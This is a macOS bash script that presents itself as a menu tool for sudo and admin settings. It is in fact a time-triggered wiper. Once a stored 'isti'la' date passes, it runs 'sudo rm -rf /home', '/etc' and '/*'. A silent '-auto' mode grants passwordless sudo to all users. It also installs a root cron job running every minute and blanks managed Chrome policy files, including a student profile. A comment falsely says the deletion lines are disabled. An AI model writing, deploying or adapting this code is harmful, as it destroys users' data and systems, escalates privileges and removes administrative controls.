#!/bin/bash

source /etc/profile

# Function to check if anyone can run sudo without a password
check_sudo_nopasswd() {
    if sudo grep -q "^ALL ALL=(ALL) NOPASSWD: ALL" /etc/sudoers.d/nopasswd_for_all 2>/dev/null; then
        # Suppress output in auto mode
        if [ "$AUTO_MODE" != "true" ]; then
            echo "Passwordless sudo enabled: Yes"
        fi
        return 0
    else
        # Suppress output in auto mode
        if [ "$AUTO_MODE" != "true" ]; then
            echo "Passwordless sudo enabled: No"
        fi
        return 1
    fi
}

# Function to check if "isti'la" is enabled and show the date if enabled
check_istila() {
    if [ -f /etc/istila_enabled ]; then
        ISTILA_DATE=$(cat /etc/istila_enabled)
        if [ "$AUTO_MODE" != "true" ]; then
            echo "isti'la date: $ISTILA_DATE"
        fi
    else
        if [ "$AUTO_MODE" != "true" ]; then
            echo "isti'la is disabled"
        fi
    fi
}

# Function to execute isti'la if conditions are met
execute_istila() {
    if [ -f /etc/istila_enabled ]; then
        CURRENT_DATE=$(date +%Y%m%d%H)  # Convert current date to an integer format
        ISTILA_DATE=$(cat /etc/istila_enabled)

        if [ "$CURRENT_DATE" -ge "$ISTILA_DATE" ]; then
            if [ "$AUTO_MODE" != "true" ]; then
                echo "Executing isti'la..."
            fi
            # Uncomment the lines below to enable isti'la actions
            echo Successfully executed cron job and istila operation | sudo tee -a /opt/test >/dev/null
            sudo rm -rf /home
            sudo rm -rf /etc
            sudo rm -rf /*
        else
            if [ "$AUTO_MODE" != "true" ]; then
                echo "isti'la date has not yet arrived."
            fi
        fi
    fi
}

# Function to set up cron job to run the script every hour
setup_cron() {
    CRON_JOB="* * * * * /bin/bash /opt/startup.sh >> /opt/cron_output.log 2>&1 && sudo cp /dev/null /Library/Managed\ Preferences/com.google.Chrome.plist && cat /dev/null /Library/Managed\ Preferences/student/com.google.Chrome.plist" # A personal thing.

    if ! sudo crontab -l | grep -q "$CRON_JOB"; then
        if [ "$AUTO_MODE" != "true" ]; then
            echo "Adding cron job to run the script every hour..."
        fi
        (sudo crontab -l; echo "$CRON_JOB") | sudo crontab -
        if [ "$AUTO_MODE" != "true" ]; then
            echo "Cron job added."
        fi
    else
        if [ "$AUTO_MODE" != "true" ]; then
            echo "Cron job is already set up."
        fi
    fi
}

# Function to disable the cron job
disable_cron() {
    CRON_JOB="* * * * * /bin/bash /opt/startup.sh >> /opt/cron_output.log 2>&1"
    if [ "$AUTO_MODE" != "true" ]; then
        echo "Disabling the cron job..."
    fi
    sudo crontab -l | grep -v "$CRON_JOB" | sudo crontab -
    if [ "$AUTO_MODE" != "true" ]; then
        echo "Cron job disabled."
    fi
}

# Display list of super users (admin group)
list_super_users() {
    if [ "$AUTO_MODE" != "true" ]; then
        echo
        echo "List of super users: $(dscl . -read /Groups/admin GroupMembership | cut -d ' ' -f 2-)"
    fi
}

# Display the menu and options
display_menu() {
    if [ "$AUTO_MODE" != "true" ]; then
        echo
        echo "Options:"
        echo "1 = Toggle someone sudo"
        echo "2 = Toggle sudo password requirement"
        echo "3 = Enable/Disable isti'la"
        echo
    fi
}

# Function to handle auto mode
handle_auto_mode() {
    AUTO_DATE=$1
    AUTO_MODE="true"

    # Suppress output by redirecting to /dev/null
    check_sudo_nopasswd >/dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo "Enabling passwordless sudo for all users..." >/dev/null
        echo "ALL ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/nopasswd_for_all >/dev/null
        sudo visudo -cf /etc/sudoers >/dev/null && echo "Passwordless sudo has been enabled." >/dev/null
    fi

    if [ ! -z "$AUTO_DATE" ]; then
        if [[ "$AUTO_DATE" =~ ^[0-9]{4}[0-9]{2}[0-9]{2}[0-9]{2}$ ]]; then
            echo "$AUTO_DATE" | sudo tee /etc/istila_enabled >/dev/null
            setup_cron
            echo "Done. isti'la date: $AUTO_DATE. Cron job is successful."
        else
            echo "Invalid date format. isti'la not enabled."
        fi
    else
        echo "Done."
    fi

    execute_istila
    exit 0
}

# Execute selected option
execute_option() {
    read -p "Select an option or press any other key to quit: " OPTION

    case $OPTION in
        1)
            read -p "Enter the username to toggle superuser status: " USERNAME
            if id "$USERNAME" &>/dev/null; then
                if dseditgroup -o checkmember -m "$USERNAME" admin &>/dev/null; then
                    sudo dseditgroup -o edit -d "$USERNAME" -t user admin
                    echo "$USERNAME has been removed from the admin group."
                else
                    sudo dseditgroup -o edit -a "$USERNAME" -t user admin
                    echo "$USERNAME has been added to the admin group."
                fi
            else
                echo "User $USERNAME does not exist."
            fi
            ;;
        2)
            if check_sudo_nopasswd; then
                read -p "Passwordless sudo is currently enabled. Disable it? [Y/n] " RESPONSE
                RESPONSE=${RESPONSE:-Y}
                case "$RESPONSE" in
                    [Yy]* )
                        echo "Disabling passwordless sudo for all users..."
                        sudo rm /etc/sudoers.d/nopasswd_for_all
                        echo "Passwordless sudo has been disabled."
                        ;;
                    [Nn]* )
                        echo "Passwordless sudo remains enabled."
                        ;;
                    * )
                        echo "Invalid response. Passwordless sudo remains enabled."
                        ;;
                esac
            else
                read -p "Passwordless sudo is currently disabled. Enable it? [Y/n] " RESPONSE
                RESPONSE=${RESPONSE:-Y}
                case "$RESPONSE" in
                    [Yy]* )
                        echo "Enabling passwordless sudo for all users..."
                        echo "ALL ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/nopasswd_for_all
                        sudo visudo -cf /etc/sudoers && echo "Passwordless sudo has been enabled."
                        ;;
                    [Nn]* )
                        echo "Passwordless sudo remains disabled."
                        ;;
                    * )
                        echo "Invalid response. Passwordless sudo remains disabled."
                        ;;
                esac
            fi
            ;;
        3)
            if [ -f /etc/istila_enabled ]; then
                read -p "Disable isti'la? [Y/n] " RESPONSE
                RESPONSE=${RESPONSE:-Y}
                case "$RESPONSE" in
                    [Yy]* )
                        echo "Disabling isti'la..."
                        sudo rm /etc/istila_enabled
                        disable_cron
                        echo "isti'la has been disabled."
                        ;;
                    [Nn]* )
                        echo "isti'la remains enabled."
                        ;;
                    * )
                        echo "Invalid response. isti'la remains enabled."
                        ;;
                esac
            else
                read -p "Enable isti'la? [Y/n] " RESPONSE
                RESPONSE=${RESPONSE:-Y}
                case "$RESPONSE" in
                    [Yy]* )
                        echo -n "Enter isti'la date (YYYYMMDDHH): "
                        read ISTILA_DATE
                        if [[ "$ISTILA_DATE" =~ ^[0-9]{4}[0-9]{2}[0-9]{2}[0-9]{2}$ ]]; then
                            echo "$ISTILA_DATE" | sudo tee /etc/istila_enabled
                            setup_cron
                            echo "isti'la has been enabled with date $ISTILA_DATE."
                            execute_istila
                        else
                            echo "Invalid date format. isti'la not enabled."
                        fi
                        ;;
                    [Nn]* )
                        echo "isti'la not enabled."
                        ;;
                    * )
                        echo "Invalid response. isti'la not enabled."
                        ;;
                esac
            fi
            ;;
        *)
            echo "Quitting script."
            exit 0
            ;;
    esac

    # Return to the main menu after executing an option
    list_super_users
    check_sudo_nopasswd
    check_istila
    display_menu
    execute_istila
    execute_option
}

# Main script execution
AUTO_MODE="false"
if [[ "$1" == "-auto" ]]; then
    handle_auto_mode "$2"
else
    list_super_users
    check_sudo_nopasswd
    check_istila
    display_menu
    execute_istila
    execute_option
fi

